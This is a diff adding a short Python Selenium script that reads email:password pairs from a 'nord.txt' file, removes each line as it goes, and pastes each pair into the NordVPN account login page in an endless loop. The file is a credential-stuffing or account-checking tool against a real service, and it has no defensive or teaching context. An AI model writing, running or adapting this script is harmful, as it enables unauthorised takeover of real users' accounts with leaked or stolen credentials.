@@ -1,0 +1,67 @@
+import pyperclip
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
+
+class parser():
+    def __init__(self):
+        self.browser = webdriver.Chrome('C:\\Users\\123\\PycharmProjects\\untitled\\venv\\chromedriver\\chromedriver.exe')
+
+    def open_txt(self):
+        browser = self.browser
+        browser.get('https://nordaccount.com/login/identifier?challenge=1a7694da36dd4ab5872098946ebe84cf')
+        time.sleep(5)
+
+        while True:
+            try:
+                self.pars()
+
+            except Exception:
+                time.sleep(3)
+
+                browser.close()
+                browser.quit()
+
+    def pars(self):
+        browser = self.browser
+
+        browser.get('https://nordaccount.com/login/identifier?challenge=1a7694da36dd4ab5872098946ebe84cf')
+
+        time.sleep(3)
+
+        line = {}
+        with open("nord.txt", "r") as f:
+            for i in range(1):
+                line[i] = f.readline()
+                stroka = line[i].split(' ')
+                pyperclip.copy(line[0])
+                s = pyperclip.paste()
+
+        f = open("nord.txt", "r+")
+        d = f.readlines()
+        f.seek(0)
+        for i in d:
+            if i != s:
+                f.write(i)
+        f.truncate()
+        f.close()
+
+
+        password = s[s.find(':')+1:]
+
+        b = s.rpartition(':')[0]
+        pyperclip.copy(b)
+
+        browser.find_element_by_xpath('//*[@id="identifier_field"]').send_keys(Keys.CONTROL, 'v')
+        browser.find_element_by_xpath('//*[@id="identifier_field"]').send_keys(Keys.ENTER)
+
+        time.sleep(5)
+        pyperclip.copy(password)
+
+        browser.find_element_by_xpath('//*[@id="password_field"]').send_keys(Keys.CONTROL, 'v')
+        browser.find_element_by_xpath('//*[@id="password_field"]').send_keys(Keys.ENTER)
+        time.sleep(5)
+
+
+bot = parser()
+bot.open_txt()
